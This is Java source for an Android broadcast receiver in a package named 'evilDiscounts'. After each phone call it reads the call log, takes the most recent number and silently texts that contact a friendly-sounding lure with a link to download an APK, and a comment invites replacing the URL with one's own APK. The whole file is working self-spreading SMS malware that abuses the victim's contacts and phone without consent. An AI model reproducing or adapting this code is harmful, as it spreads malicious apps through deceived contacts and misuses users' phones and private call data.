package com.evilDiscounts;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.telephony.SmsManager;
import android.util.Log;

/*
 * This receiver is triggered a minute after a phone call ends. It will send a text with the app download link
 * to the last contacted person in the user's call log.
 */
public class SendSMSReceiver extends BroadcastReceiver {
  // SMS message content to be sent. Replace URL with your apk location
  private static final String MESSAGE = "Yo, I forgot to tell you to get this app: http://www.paintedostrich.com/discounts.apk";

  @Override
  public void onReceive(Context context, Intent intent) {
    // Get the last call from the call log and send a message to them.
    String[] strFields = { android.provider.CallLog.Calls.NUMBER,
        android.provider.CallLog.Calls.CACHED_NAME, };
    String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

    Cursor callCursor = context.getContentResolver().query(
            android.provider.CallLog.Calls.CONTENT_URI, strFields, null, null, strOrder);
    callCursor.moveToFirst();
    String number = callCursor.getString(callCursor
            .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
    sendSMS(context, number, MESSAGE);
  }

  // This method sends the text message.
  private void sendSMS(Context context, String phoneNumber, String message) {
    PendingIntent pi = PendingIntent.getActivity(context, 0, new Intent(), 0);
    SmsManager sms = SmsManager.getDefault();
    sms.sendTextMessage(phoneNumber, null, message, pi, null);
    Log.i("SENT_SMS", "Send sms to " + phoneNumber);
  }
}
